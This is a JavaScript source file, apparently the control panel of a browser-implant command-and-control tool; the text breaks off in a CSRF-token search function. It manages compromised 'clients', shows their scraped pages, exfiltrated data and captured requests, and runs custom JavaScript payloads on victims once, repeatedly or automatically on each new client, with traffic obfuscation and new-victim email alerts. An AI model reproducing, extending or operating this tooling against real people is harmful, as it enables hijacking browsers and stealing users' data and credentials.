let selectedClientId = "";
let lastSelectedAppId = "";
let lastSelectedBrowserId = "";
let refreshingDetails = false;
let tokenUrl         = "";
let tokenLocation    = "";
let tokenKey         = "";

let clientUpdateRate = 5;
let updateTimer = setInterval(updateClients, (clientUpdateRate * 1000));



// Syntax highlighting code editor
let codeEditor;
let codeEditorLoaded = false;
let codeEditorBig    = false;


// initialized booleans
let appSettingsEvents = false;


// Lazy loading stuff
let clientLoadCount       = 30;
let clientLoadExtraCount  = 0;
let clientIncrementAmount = 20;


function initializeCodeMirror()
{
	if (!codeEditorLoaded)
	{
		//console.log("Instantiating code editor");
		var textArea = document.getElementById('payload-editor');

		codeEditor = CodeMirror.fromTextArea(textArea,  {
			value: "",
			mode:  "javascript",
			lineNumbers: false,
			theme: "default"
		});

		codeEditorLoaded = true;
		codeEditor.refresh();
	}
}




function escapeHTML(string) 
{
	if (string === undefined || string === null) 
	{
		return '';
	}

	return String(string)
	.replace(/&/g, "&amp;")
	.replace(/</g, "&lt;")
	.replace(/>/g, "&gt;")
	.replace(/"/g, "&quot;")
	.replace(/'/g, "&#039;");
}




function showClientFilterModal()
{
	var modal = new bootstrap.Modal(document.getElementById("clientFilterModal"));
	modal.show();
}



function toggleStar(imgObject, event, client, nickname)
{
	// console.log("Top of toggleStar");
	var starred = "";

	if (imgObject.src.includes('star.svg'))
	{
		imgObject.src = '/protectedStatic/star-fill.svg';
		// console.log("Filling star...");

		starred = true;
	}
	else
	{
		imgObject.src = '/protectedStatic/star.svg';
		// console.log("Emptying star...");

		starred = false;
	}

	// Block resetting of loot card stack
	event.stopPropagation();



	// Send star to server for database
	fetch('/api/updateClientStar/' + client, {
		method:"POST",
		body: JSON.stringify({
			isStarred: starred
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});
}



function blockIP()
{
	var inputField = document.getElementById('ipInput');
	var ipAddress  = inputField.value;

	const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;

	if (ipv4Regex.test(ipAddress)) 
	{
		fetch('/api/blockIP', {
			method:"POST",
			body: JSON.stringify({
				ip: ipAddress
			}),
			headers: {
				"Content-type": "application/json; charset=UTF-8"
			}
		})
		.then(response => {
			inputField.value = "";
			refreshBlockedIPList();			
		});
	} 
	else 
	{
		alert('Invalid IPv4 address. Please enter a valid IPv4 address.');
	}

	inputField.value = "";
	refreshBlockedIPList();
}



function addEmail()
{
	var inputField = document.getElementById('emailInput');
	var address    = inputField.value;

	const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;

	if (emailRegex.test(address))
	{
		fetch('/api/addTargetEmail', {
			method:"POST",
			body: JSON.stringify({
				emailAddress: address
			}),
			headers: {
				"Content-type": "application/json; charset=UTF-8"
			}
		})
		.then(response => {
			inputField.value = "";
			refreshTargetEmailList();			
		});
	}
	else
	{
		alert("Invalid email address, please enter a valid email address.");
	}

	inputField.value = "";
	refreshTargetEmailList();
}



function blockClient(imgObject, event, client, nickname)
{
	console.log("Blocking client: " + nickname);
	console.log("Client id: " + client);

	var userConfirmed = window.confirm('Do you want to block ' + nickname 
		+ ' from uploading additional events?\n\nThis will invalidate their "session"');

	if (userConfirmed)
	{
		console.log("Yeah, screw that asshole");
		fetch('/api/blockClientSession/' + client);
	}
	else
	{
		console.log("Nah, keep the client session...");
	}

	// Block resetting of loot card stack
	event.stopPropagation();
}



function selectAllEvents()
{
	var filterModal = document.getElementById('eventFilterModal');
	var checkboxes  = filterModal.querySelectorAll('input[type="checkbox"]');

	checkboxes.forEach(function(checkbox)
	{
		checkbox.checked = true;
	});
}


function selectNoEvents()
{
	var filterModal = document.getElementById('eventFilterModal');
	var checkboxes  = filterModal.querySelectorAll('input[type="checkbox"]');

	checkboxes.forEach(function(checkbox)
	{
		checkbox.checked = false;
	});
}


function showEventFilterModal()
{
	var modal = new bootstrap.Modal(document.getElementById("eventFilterModal"));
	modal.show();
}


function updateEvents()
{	
	// Remove detail cards
	detailCardStack = document.getElementById('detail-stack');
	while (detailCardStack.firstChild)
	{
		detailCardStack.firstChild.remove();
	}

	getClientDetails(selectedClientId);
}



async function showHtmlCode(eventKey)
{
	htmlScrapeReq   = await fetch('/api/clientHtml/' + eventKey);
	htmlScrapeJson  = await htmlScrapeReq.json();
	scrapedHtmlCode = htmlScrapeJson.code;



	prettyPrintCode = window.html_beautify(scrapedHtmlCode, {indent_size: 2});

	modalContent = document.getElementById("code-viewer-body");
	modalContent.innerHTML = prettyPrintCode;

	var modal = new bootstrap.Modal(document.getElementById('codeModal'));
	modal.show();
}



function downloadHtmlCode(fileName)
{
	window.open(fileName, "_blank");
}



async function showExfilViewer(eventKey)
{
	exfilData     = await fetch('/api/clientCustomExfilDetail/' + eventKey);
	exfilDataJson = await exfilData.json();

	var modal = new bootstrap.Modal(document.getElementById('customPayloadExfilModal'));


	modalContent = document.getElementById("exfil-data-viewer");

	prettyPrintCode = window.html_beautify(atob(exfilDataJson.data), {indent_size: 2});
	modalContent.innerHTML = prettyPrintCode;
	modal.show();
}





function saveAllNotesToFile()
{
	console.log("** Starting saveAllNotesToFile...");
	const notesContent = document.getElementById("all-note-viewer").innerHTML;

	const noteBlob = new Blob([notesContent], {type:'text/plain'});

	const anchor = document.getElementById('downloadLink');
	anchor.href = URL.createObjectURL(noteBlob);
	anchor.download = 'clientNotes.txt';
	anchor.click();

    // Release the URL object
	URL.revokeObjectURL(anchor.href);
}




async function showAllNotesModal()
{
	var modal = new bootstrap.Modal(document.getElementById("allNoteViewerModal"));

	var req = await fetch('/api/allClientNotes');
	var jsonResponse = await req.json();

	var downloadButton = document.getElementById('note-download-button');


	var noteArea = document.getElementById('all-note-viewer');

	noteArea.innerHTML = "";

	noteArea.innerHTML += "*******************************************\n";

	for (let i = 0; i < jsonResponse.length; i++)
	{
		console.log("Note loop: " + i);
		console.log("Nickname:" + jsonResponse[i].client);
		console.log("Notes:" + jsonResponse[i].note);

		noteArea.innerHTML += "Client:\n" + jsonResponse[i].client + "\n";
		noteArea.innerHTML += "\nNotes:\n";
		noteArea.innerHTML += atob(jsonResponse[i].note);
		noteArea.innerHTML += "\n\n";
		noteArea.innerHTML += "*******************************************\n";
	}

		// Handle saving modified notes
	downloadButton.onclick = function(event) {
		console.log("Gotta download button press...");
		saveAllNotesToFile();
	}

	modal.show();
}


async function refreshBlockedIPList()
{
	var blockedIPList = document.getElementById('blockedIPList');

	blockedIPList.innerHTML = '';

	// Handle the blocked IPs now
	var req = await fetch('/api/getBlockedIPs');
	var jsonResponse = await req.json();

	for (let i = 0; i < jsonResponse.length; i++)
	{
		id = jsonResponse[i].id;
		ip = jsonResponse[i].ip;

		var blockedIP = document.createElement('li');
		blockedIP.className   = 'list-group-item d-flex justify-content-between align-items-center';
		blockedIP.textContent = ip;
		blockedIP.id          = id;

		var deleteButton = document.createElement('button');
		deleteButton.id          = id;
		deleteButton.ip          = ip;
		deleteButton.className   = 'btn btn-sm me-2';
		deleteButton.textContent = 'Delete';


		deleteButton.addEventListener('click', function()
		{
			// Run on this clients
			deleteBlockedIP(this);
		})

		blockedIP.appendChild(deleteButton);
		blockedIPList.appendChild(blockedIP);
	}
}



async function refreshTargetEmailList()
{
	var targetEmailList = document.getElementById('emailAddressList');

	targetEmailList.innerHTML = '';

	var req = await fetch('/api/getTargetEmails');
	var jsonResponse = await req.json();

	for (let i = 0; i < jsonResponse.length; i++)
	{
		id      = jsonResponse[i].id;
		address = jsonResponse[i].address;

		var targetEmail = document.createElement('li');
		targetEmail.className   = 'list-group-item d-flex justify-content-between align-items-center'; 
		targetEmail.textContent = address;
		targetEmail.id          = id;

		var deleteButton = document.createElement('button');
		deleteButton.id          = id;
		deleteButton.emailAddy   = address;
		deleteButton.className   = 'btn btn-sm me-2';
		deleteButton.textContent = 'Delete';


		deleteButton.addEventListener('click', function()
		{
			// Run on this clients
			deleteTargetEmail(this);
		})

		targetEmail.appendChild(deleteButton);
		targetEmailList.appendChild(targetEmail);
	}
}


async function deleteBlockedIP(button)
{
	await fetch('/api/deleteBlockedIP/' + button.id);

	refreshBlockedIPList();
}



async function deleteTargetEmail(button)
{
	await fetch('/api/deleteTargetEmail/' + button.id);

	refreshTargetEmailList();
}



async function showAppSettingsModal()
{
	var modal = new bootstrap.Modal(document.getElementById("clientSessionModal"));

	// Is traffic obfuscation enabled?
	var obfuscateReq      = await fetch('/api/app/obfuscateTraffic');
	var obfuscateResponse = await obfuscateReq.json();

	// Let's figure out if new sessions are allowed right now
	var req          = await fetch('/api/app/allowNewClientSessions');
	var jsonResponse = await req.json();

	// Get our current client refresh delay
	var delayRequest  = await fetch('/api/app/clientRefreshRate');
	var delayResponse = await delayRequest.json();

	var obfuscateSwitch = document.getElementById('obfuscateTraffic');
	var checkBox        = document.getElementById('allowNewClientSessions');
	var clientDelay     = document.getElementById('clientRefreshDelay');


	var saveButton      = document.getElementById('saveEmailSettings');
	var testEmailButton = document.getElementById('sendTestEmail');

	var serverString  = document.getElementById('smtpServer');
	var emailUsername = document.getElementById('emailUsername');
	var emailPassword = document.getElementById('emailPassword');
	var notifyEvent   = document.getElementById('emailNotificationType');
	var emailDelay    = document.getElementById('emailDelay');
	var emailEnable   = document.getElementById('enableEmails');

	var fingerprintEnable = document.getElementById('showFingerprints');


	var emailData     = await fetch('/api/app/getEmailSettings');
	var emailDataJson = await emailData.json();

	serverString.value  = emailDataJson.emailServer;
	emailUsername.value = emailDataJson.username;
	emailPassword.value = emailDataJson.password;
	emailDelay.value    = emailDataJson.delay;


	switch(emailDataJson.eventType)
	{
	case 'newClients':
		notifyEvent.value = "newClients";
		break;
	case 'newClientsAndEvents':
		notifyEvent.value = "newClientsAndEvents";
		break;
	case 'None':
		notifyEvent.value = "newClients";
		break;
	default:
		alert("Error parsing email notification event type." + emailDataJson.eventType);
	}

	var emailsEnabledReq  = await fetch('/api/app/getEmailNotificationSetting');
	var emailsEnabledJson = await emailsEnabledReq.json();

	if (emailsEnabledJson.emailEnable)
	{
		emailEnable.checked  = true;
	}
	else
	{
		emailEnable.checked = false;
	}

	clientDelay.value = delayResponse.clientRefreshRate;


	if (obfuscateResponse.obfuscateTraffic == '1')
	{
		obfuscateSwitch.checked = true;
	}
	else
	{
		obfuscateSwitch.checked = false;
	}


	if (jsonResponse.newSessionsAllowed == '1')
	{
			// console.log("Server says sessions are allowed!");
		checkBox.checked == true;
	}
	else
	{
			// console.log("Server says no more client sessions!");
		checkBox.checked == false;
	}




	if (!appSettingsEvents)
	{
		obfuscateSwitch.addEventListener('change', function()
		{
			if (obfuscateSwitch.checked)
			{
				console.log("Turning on obfuscation!");
				fetch('/api/app/setObfuscateTraffic/true');
			}
			else
			{
				console.log("Turning off obfuscation!");
				fetch('/api/app/setObfuscateTraffic/false');
			}
		});

		notifyEvent.addEventListener('change', function()
		{
			console.log("^^^^^ event type now: " + notifyEvent.value)
		});

		emailEnable.addEventListener('change', function()
		{
			if (emailEnable.checked)
			{
			// enable
				fetch('/api/app/enableEmailNotifications/true');
				console.log("Turning on email notifications");
			}
			else
			{
			// disabled
				fetch('/api/app/enableEmailNotifications/false');
				console.log("Turning off email notifications");
			}
		});



		fingerprintEnable.addEventListener('change', function()
		{
			if (fingerprintEnable.checked)
			{
				// enable
				fetch('/api/app/showFingerprint/true');
			}
			else
			{
				// disable
				fetch('/api/app/showFingerprint/false');
			}
		});


		clientDelay.addEventListener('change', function()
		{
			if (clientDelay.value < 1)
			{
				clientDelay.value = 1;
			}
			else if (clientDelay.value > 3600)
			{
				clientDelay.value = 3600;
			}

			fetch('/api/app/setClientRefreshRate/' + clientDelay.value);
			clientUpdateRate = clientDelay.value;
			clearInterval(updateTimer);
			updateTimer = setInterval(updateClients, (clientUpdateRate * 1000));
		});


		saveButton.addEventListener('click', function()
		{

			console.log("*** Saving email settings...");

			fetch('/api/app/saveEmailSettings', {
				method:"POST",
				body: JSON.stringify({
					emailServer: serverString.value,
					username: emailUsername.value,
					password: emailPassword.value,
					eventType: notifyEvent.value,
					delay: emailDelay.value
				}),
				headers: {
					"Content-type": "application/json; charset=UTF-8"
				}
			});

			saveButton.blur();
		});


		testEmailButton.addEventListener('click', function()
		{
			console.log("Sending test email...");
			fetch('/api/sendTestEmail');

			testEmailButton.blur();
		});

		appSettingsEvents = true;
	}


	refreshBlockedIPList();
	refreshTargetEmailList();

	modal.show();
}




function importPayloads(event)
{
	const file   = event.target.files[0];
	const reader = new FileReader();

	reader.onload = function(event)
	{
		const fileContent = event.target.result;

		try 
		{
			const jsonData = JSON.parse(fileContent);

			fetch('/api/savePayloads', {
				method:"POST",
				body: JSON.stringify(jsonData),
				headers: {
					"Content-type": "application/json; charset=UTF-8"
				}
			})
			.then(response => {
				refreshSavedPayloadList();
			});		
		}
		catch (error)
		{
			alert("Error parsing payloads file. See README for formatting.");
			console.error('An error occurred:', error);
			console.log('Error name:', error.name);
			console.log('Error message:', error.message);
			console.log('Stack trace:', error.stack);
		}
	}
	reader.readAsText(file);
	document.getElementById('payload-import-button').blur();
	event.target.value = "";
	refreshSavedPayloadList();
}



async function exportAllPayloads(button)
{
	payloadResponse = await fetch('/api/getAllPayloads');
	payloadJson     = await payloadResponse.json();

	const payloadString = JSON.stringify(payloadJson);
	const payloadBlob = new Blob([payloadString], {type:'text/plain'});

	const anchor = document.getElementById('exportLink');
	anchor.href  = URL.createObjectURL(payloadBlob);
	anchor.download = 'customPayloadExport.json';
	anchor.click();

	URL.revokeObjectURL(anchor.href);

	button.blur();
}



async function selectPayload(payload)
{
	codeResponse = await fetch('/api/getSavedPayloadCode/' + payload.id);
	codeJson     = await codeResponse.json();
	description  = atob(codeJson.description);
	code         = atob(codeJson.code);

	var payloadNameInput   = document.getElementById('payloadName');
	var payloadDescription = document.getElementById('payloadDescription');
	// var payloadCode        = document.getElementById('payload-editor');

	payloadNameInput.value   = payload.name;
	payloadDescription.value = description;
	codeEditor.setValue(code);
}


async function autorunPayload(autorunToggle)
{
	var autorun = false;

    // Toggle button functionality
	if (autorunToggle.classList.contains('active'))
	{
        // If the button is active, deactivate it
		autorunToggle.classList.remove('active');
		autorunToggle.style.borderWidth = '';
		autorunToggle.style.borderColor = '';
		autorun = false;
	} 
	else 
	{
        // If the button is inactive, activate it
		autorunToggle.classList.add('active');
		autorunToggle.style.borderWidth = '2px';
		autorunToggle.style.borderColor = 'green';
		autorun = true;
	}

	// Update autorun status server side
	fetch('/api/setPayloadAutorun', {
		method:"POST",
		body: JSON.stringify({
			name: autorunToggle.name,
			autorun: autorun
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});
}



async function runPayloadAllClient(button)
{
	await fetch('/api/runPayloadAllClients/' + button.id);
	button.style.borderWidth = '2px';
	button.style.borderColor = 'green';

	setTimeout(function()
	{
		button.style.borderWidth = '';
		button.style.borderColor = '';
	}, 750);
}



async function repeatPayloadAllClients(repeatRunToggle)
{
	var repeatrun = false;

	//Toggle functionality
	if (repeatRunToggle.classList.contains('active'))
	{
        // If the button is active, deactivate it
		repeatRunToggle.classList.remove('active');
		repeatRunToggle.style.borderWidth = '';
		repeatRunToggle.style.borderColor = '';
		repeatrun = false;
	} 
	else 
	{
        // If the button is inactive, activate it
		repeatRunToggle.classList.add('active');
		repeatRunToggle.style.borderWidth = '2px';
		repeatRunToggle.style.borderColor = 'green';
		repeatrun = true;
	}


	// Update autorun status server side
	fetch('/api/setPayloadRepeatRun', {
		method:"POST",
		body: JSON.stringify({
			name: repeatRunToggle.name,
			repeatrun: repeatrun
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});
}


async function repeatPayloadClient(repeatRunToggle)
{
	var repeatrun = false;

	var payloadId = repeatRunToggle.id;
	var clientId  = repeatRunToggle.client;


	//Toggle functionality
	if (repeatRunToggle.classList.contains('active'))
	{
        // If the button is active, deactivate it
		repeatRunToggle.classList.remove('active');
		repeatRunToggle.style.borderWidth = '';
		repeatRunToggle.style.borderColor = '';
		repeatrun = false;
	} 
	else 
	{
        // If the button is inactive, activate it
		repeatRunToggle.classList.add('active');
		repeatRunToggle.style.borderWidth = '2px';
		repeatRunToggle.style.borderColor = 'green';
		repeatrun = true;
	}


	// Update repeatrun status server side
	fetch('/api/singleClientPayloadRepeatRun', {
		method:"POST",
		body: JSON.stringify({
			name: repeatRunToggle.name,
			clientID: clientId,
			repeatrun: repeatrun
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});
}





async function runPayloadSingleClient(button, modal)
{
	var payloadId = button.id;
	var clientId  = button.client;

	fetch('/api/runPayloadSingleClient', {
		method:"POST",
		body: JSON.stringify({
			payloadKey: payloadId,
			clientKey: clientId
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});

	button.style.borderWidth = '2px';
	button.style.borderColor = 'green';

	setTimeout(function()
	{
		button.style.borderWidth = '';
		button.style.borderColor = '';
		// modal.hide();
	}, 750);
}



function showSingleClientPayloadModal(event, client)
{
	var modal = new bootstrap.Modal(document.getElementById('singleClientPayloadModal'));
	var savedPayloadsList = document.getElementById('singleClientPayloadList');

	refreshSingleClientPayloadList(client, modal);
	modal.show();
	// Block resetting of loot card stack
	event.stopPropagation();
}



async function deletePayload(event, button)
{
	await fetch('/api/deletePayload/' + button.id);
	refreshSavedPayloadList();
}


async function refreshSingleClientPayloadList(client, modal)
{
	var savedPayloadsList = document.getElementById('singleClientPayloadList');

	savedPayloadsList.innerHTML = '';

	// Let's get our saved payloads from the database
	var req = await fetch('/api/getPayloadsForClient/' + client);
	var jsonResponse = await req.json();

	for (let i = 0; i < jsonResponse.length; i++)
	{
		id        = jsonResponse[i].id;
		name      = jsonResponse[i].name;
		repeatrun = jsonResponse[i].repeatrun;


		var payload = document.createElement('li');
		payload.className   = 'list-group-item d-flex justify-content-between align-items-center';
		payload.textContent = name;
		payload.name        = name;
		payload.id          = id;

		var executePayloadButton         = document.createElement('button');
		executePayloadButton.id          = id;
		executePayloadButton.client      = client;
		executePayloadButton.className   = 'btn btn-sm me-2';
		executePayloadButton.textContent = 'Run';
		executePayloadButton.setAttribute('data-toggle', 'tooltip');
		executePayloadButton.setAttribute('title', 'Run Payload on this Client');


		executePayloadButton.addEventListener('click', function()
		{
			// Run on this clients
			runPayloadSingleClient(this, modal);
		})


		var repeatPayloadToggle         = document.createElement('button');
		repeatPayloadToggle.id          = id;
		repeatPayloadToggle.className   = 'btn btn-sm me-2';
		repeatPayloadToggle.textContent = 'Repeat';
		repeatPayloadToggle.name        = name;
		repeatPayloadToggle.client      = client;

		repeatPayloadToggle.setAttribute('data-toggle', 'tooltip');
		repeatPayloadToggle.setAttribute('title', 'Repeatedly rerun Payload on this Client');


		repeatPayloadToggle.addEventListener('click', function()
		{
			// Run on all clients
			repeatPayloadClient(this, modal);
		})


		// If it was already toggled on in the database, make sure we reflect that here
		if (repeatrun)
		{
			repeatPayloadToggle.classList.add('active');
			repeatPayloadToggle.style.borderWidth = '2px';
			repeatPayloadToggle.style.borderColor = 'green';
		}

		var spacerDiv = document.createElement('div');
		spacerDiv.className = 'ms-auto'; 

		payload.appendChild(spacerDiv);
		payload.appendChild(repeatPayloadToggle);
		payload.appendChild(executePayloadButton);
		savedPayloadsList.appendChild(payload);
	}
}





async function refreshSavedPayloadList()
{
	var savedPayloadsList = document.getElementById('savedPayloadsList');

	savedPayloadsList.innerHTML = '';

	// Let's get our saved payloads from the database
	var req = await fetch('/api/getSavedPayloads');
	var jsonResponse = await req.json();

	for (let i = 0; i < jsonResponse.length; i++)
	{
		id          = jsonResponse[i].id;
		name        = jsonResponse[i].name;
		autorun     = jsonResponse[i].autorun;
		repeatrun   = jsonResponse[i].repeatrun;

		var payload = document.createElement('li');
		payload.className   = 'list-group-item d-flex justify-content-between align-items-center';
		payload.textContent = name;
		payload.name        = name;
		payload.id          = id;

		payload.addEventListener('click', function() 
		{
			selectPayload(this);
		});


		var autorunToggle         = document.createElement('button');
		autorunToggle.type        = 'button';
		autorunToggle.className   = 'btn btn-sm btn-toggle me-2';
		autorunToggle.textContent = 'Autorun';
		autorunToggle.name        = name;
		autorunToggle.setAttribute('data-toggle', 'tooltip');
		autorunToggle.setAttribute('title', 'Automatically Run Payload on All New Clients Once');


		autorunToggle.addEventListener('click', function() 
		{
			autorunPayload(this);
		});

		// If it was already toggled on in the database, make sure we reflect that here
		if (autorun)
		{
			console.log("On payload load: " + autorunToggle.name + " should be toggled on autorun");
			autorunToggle.classList.add('active');
			autorunToggle.style.borderWidth = '2px';
			autorunToggle.style.borderColor = 'green';
		}

		var executePayloadButton         = document.createElement('button');
		executePayloadButton.id          = id;
		executePayloadButton.className   = 'btn btn-sm me-2';
		executePayloadButton.textContent = 'Run';
		executePayloadButton.setAttribute('data-toggle', 'tooltip');
		executePayloadButton.setAttribute('title', 'Run Payload on All Clients Once');


		executePayloadButton.addEventListener('click', function()
		{
			// Run on all clients
			runPayloadAllClient(this);
		})

		var repeatPayloadToggle         = document.createElement('button');
		repeatPayloadToggle.id          = id;
		repeatPayloadToggle.className   = 'btn btn-sm me-2';
		repeatPayloadToggle.textContent = 'Repeat';
		repeatPayloadToggle.name        = name;

		repeatPayloadToggle.setAttribute('data-toggle', 'tooltip');
		repeatPayloadToggle.setAttribute('title', 'Repeatedly rerun Payload on All Clients');


		repeatPayloadToggle.addEventListener('click', function()
		{
			// Run on all clients
			repeatPayloadAllClients(this);
		})


		// If it was already toggled on in the database, make sure we reflect that here
		if (repeatrun)
		{
			repeatPayloadToggle.classList.add('active');
			repeatPayloadToggle.style.borderWidth = '2px';
			repeatPayloadToggle.style.borderColor = 'green';
		}




		var deletePayloadButton         = document.createElement('button');
		deletePayloadButton.id          = id;
		deletePayloadButton.className   = 'btn btn-sm';
		deletePayloadButton.textContent = 'Delete';
		deletePayloadButton.setAttribute('data-toggle', 'tooltip');
		deletePayloadButton.setAttribute('title', 'Delete This Payload');

		deletePayloadButton.addEventListener('click', function()
		{
			// delete from database
			deletePayload(event, this);
			event.stopPropagation();
			event.preventDefault();
		})

		var spacer = document.createElement('div');
		spacer.className = 'flex-grow-1';

		payload.appendChild(spacer);
		payload.appendChild(autorunToggle);
		payload.appendChild(repeatPayloadToggle);
		payload.appendChild(executePayloadButton);
		payload.appendChild(deletePayloadButton);
		savedPayloadsList.appendChild(payload);
	}
}




function toggleCodeEditor()
{
	var codeDiv                 = document.getElementById('payload-editor');
	var editorCol               = document.getElementById('payloadEditor');
	var listCol                 = document.getElementById('savedPayloadsList');
	var listGroup               = document.getElementById('savedPayloadsGroup');
	var payloadNameGroup        = document.getElementById('payloadNameGroup');
	var payloadDescriptionGroup = document.getElementById('payloadDescriptionGroup');
	var toggleCodeButton        = document.getElementById('payload-code-button');

	    // Toggle the editor column to full width and back
	if (editorCol.classList.contains('col-md-12')) 
	{
		this.textContent = "Expand Code";
		editorCol.classList.remove('col-md-12');
		editorCol.classList.add('col-md-6');
		listCol.classList.remove('d-none');
		listGroup.style.display               = "block";
		payloadNameGroup.style.display        = "block";
		payloadDescriptionGroup.style.display = "block";
		codeEditor.setSize(null, "300px");
		codeEditor.refresh();
		codeEditorBig = false;
	} 
	else 
	{
		this.textContent = "Shrink Code";
		editorCol.classList.remove('col-md-6');
		editorCol.classList.add('col-md-12');
		listCol.classList.add('d-none');
		listGroup.style.display               = "none";
		payloadNameGroup.style.display        = "none";
		payloadDescriptionGroup.style.display = "none";
		codeEditor.setSize(null, "600px");
		codeEditor.refresh();
		codeEditorBig = true;
	}

	toggleCodeButton.blur();
}


async function showCustomPayloadModal(skipClear)
{
	console.log("showing custom payloads...");
	var modal = new bootstrap.Modal(document.getElementById('customPayloadModal'));

	var modalElement      = document.getElementById('customPayloadModal');
	var saveButton        = document.getElementById('payload-save-button');
	var importButton      = document.getElementById('payload-import-button');
	var exportButton      = document.getElementById('payload-export-button');
	var clearJobsButton   = document.getElementById('payload-clear-button');
	var closeButton       = document.getElementById('payload-close-button');
	var toggleCodeButton  = document.getElementById('payload-code-button');


	var payloadNameInput   = document.getElementById('payloadName');
	var payloadDescription = document.getElementById('payloadDescription');
	var payloadCode        = document.getElementById('payload-editor');

	var savedPayloadsList = document.getElementById('savedPayloadsList');

	initializeCodeMirror();

	if (codeEditorBig)
	{
		// Make sure we start with whole UI visible
		toggleCodeEditor();
	}

	if (!skipClear)
	{
		// console.log("-----CLEARING CODE");
		payloadNameInput.value   = "";
		payloadDescription.value = "";
		codeEditor.setValue("");
		codeEditor.refresh();
	}

	modalElement.addEventListener('shown.bs.modal', function ()
	{
		if (codeEditor) 
		{
			codeEditor.refresh();
		}
	});

	saveButton.disabled      = false;


	refreshSavedPayloadList();

	// Detect unsaved changes
	var unsavedChanges = false;

	payloadNameInput.addEventListener('input', function() 
	{
		unsavedChanges = true;
		//console.log("Name Unsaved changes!");
	});

	payloadDescription.addEventListener('input', function() 
	{
		unsavedChanges = true;
	//	console.log("Description Unsaved changes!");
	});


	codeEditor.on("change", function(cm, change) 
	{
		if (change.origin === "+input" || change.origin === "paste") 
		{
			unsavedChanges = true;
//	        console.log("Human-made change detected in Code Editor.");
		} 
	});


	closeButton.onclick = function(event) 
	{
		if (unsavedChanges)
		{
			console.log("Oh no! unsaved changes on close!");

			var userConfirmed = window.confirm('You have unsaved changes, close anyway?');

			if (userConfirmed)
			{
				console.log("Don't care, lose my changes");
				modal.hide();
			}
			else
			{
				event.stopPropagation();
				console.log("NO! I need to SAVE!");
			}
		}
		else
		{
			console.log("No unsaved changes, close away..");
			modal.hide();
		}
	}


	// Handle saving modified notes
	saveButton.onclick = function(event) 
	{
		console.log("Gotta save payload button..");
		if (payloadNameInput.value === "")
		{
			console.log("Oh no, failed to set a name!");
			event.preventDefault();
			payloadNameInput.classList.add('is-invalid');
		}
		else
		{
			payloadNameInput.classList.remove('is-invalid');
			console.log("Payload name is: " + payloadNameInput.value);


			unsavedChanges = false;

			// send payload to server
			fetch('/api/savePayload', {
				method:"POST",
				body: JSON.stringify({
					name: payloadNameInput.value,
					description: btoa(payloadDescription.value),
					code: btoa(codeEditor.getValue())
				}),
				headers: {
					"Content-type": "application/json; charset=UTF-8"
				}
			})
			.then(response => {
				if (!response.ok) {
					console.log('Save payload server failed.');
				}
				return response.text();
			})
			.then(text => {
				refreshSavedPayloadList();
			});	
		}
		saveButton.blur();
	}



	clearJobsButton.onclick = function(event)
	{
		var userConfirmed = window.confirm('Do you want to clear all custom payload jobs from all clients\nand disable all auto/repeat run jobs?');

		if (userConfirmed)
		{
			console.log("Clearing all jobs!");
			fetch('/api/clearAllPayloadJobs')
			.then(response => {
				refreshSavedPayloadList();
			});
		}

		clearJobsButton.blur();
	}



	toggleCodeButton.onclick = function(event)
	{
		toggleCodeEditor();
	}	

	var importInput = document.getElementById('importInput');
	importInput.removeEventListener('change', importPayloads);
	importInput.addEventListener('change', importPayloads, false);

	importButton.onclick = function(event) 
	{
		importInput.click();
	}


	exportButton.onclick = function(event) 
	{
		console.log("Export button pressed");
		exportAllPayloads(this);
	}

	modal.show();
	codeEditor.refresh();	
}





function updateClientSessions()
{
	var checkBox = document.getElementById('allowNewClientSessions');

	if (checkBox.checked == true)
	{
		fetch('/api/app/setAllowNewClientSessions/1');
	}
	else
	{
		fetch('/api/app/setAllowNewClientSessions/0');
	}
}


function showNoteEditor(event, client, nickname, notes)
{
	// console.log("STARTING SHOW NOTE EDITOR!!!!");
	var modal      = new bootstrap.Modal(document.getElementById("noteEditorModal"));
	var noteTitle  = document.getElementById('note-editor-title');
	var noteEditor = document.getElementById('note-editor');
	var saveButton = document.getElementById('note-save-button');


	// Handle saving modified notes
	saveButton.onclick = function(event) {
		console.log("Saving note for: " + client);
		var newNotes = noteEditor.value;

		console.log("New notes value:");
		console.log(newNotes);

		encodedNotes = btoa(newNotes);

		// Send notes to server
		fetch('/api/updateClientNotes/' + client, {
			method:"POST",
			body: JSON.stringify({
				note: encodedNotes
			}),
			headers: {
				"Content-type": "application/json; charset=UTF-8"
			}
		});

		modal.hide();
		updateClients();
	};


	noteTitle.innerHTML = '<u>' + nickname + '</u> notes:';
	noteEditor.value = atob(notes);
	modal.show();


	// Block resetting of loot card stack
	event.stopPropagation();
}




async function showReqRespViewer(eventKey, type)
{
	if (type == "XHR")
	{
		xhrCallReq  = await fetch('/api/clientXhrCall/' + eventKey);
		xhrCallJson = await xhrCallReq.json();

		requestBody  = xhrCallJson.requestBody;
		responseBody = xhrCallJson.responseBody;
	}
	else if (type == "FETCH")
	{
		fetchCallReq  = await fetch('/api/clientFetchCall/' + eventKey);
		fetchCallJson = await fetchCallReq.json();

		requestBody  = fetchCallJson.requestBody;
		responseBody = fetchCallJson.responseBody;
	}
	else
	{
		console.log("Invalid type in showReqRespViewer");
	}

	prettyRequest  = window.js_beautify(atob(requestBody), {indent_size: 2});
	prettyResponse = window.js_beautify(atob(responseBody), {indent_size: 2});

	requestContent = document.getElementById("requestBox");
	requestContent.innerHTML = prettyRequest;

	responseContent = document.getElementById("responseBox");
	responseContent.innerHTML = prettyResponse;



	var modal = new bootstrap.Modal(document.getElementById('requestResponseModal'));
	modal.show();
}



async function searchCSRFToken(eventKey, tokenName, tokenValue)
{
	var searchDataDiv = document.getElementById('searchDataDiv');

	searchDataDiv.innerHTML = "";

	tokenSearchReq = await fetch('/api/formCsrfTokenSearch/' + eventKey, {
		method:"POST",
		body: JSON.stringify({
			tokenName: tokenName,
			tokenValue: tokenValue
		}),
		headers: {
